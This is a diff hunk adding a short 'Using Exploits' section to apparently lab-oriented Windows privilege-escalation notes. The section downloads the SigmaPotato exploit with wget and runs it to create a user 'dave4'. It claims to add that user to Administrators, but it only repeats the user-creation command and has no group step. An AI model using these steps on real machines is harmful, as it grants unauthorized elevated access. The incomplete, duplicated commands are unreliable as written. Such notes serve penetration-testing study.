@@ -1206,4 +1206,18 @@ schtasks /query /fo LIST /v | findstr C:\Users
 
 ### Using Exploits
 
+#### Downloading SigmaPotato.exe
+
+~~~ powershell
+wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
+~~~
+
+#### Using the SigmaPotato tool to get add a new user to the Administrators localgroup
+
+~~~ powershell
+.\SigmaPotato "net user dave4 lab /add"
+.\SigmaPotato "net user dave4 lab /add"
+~~~
+
+
 
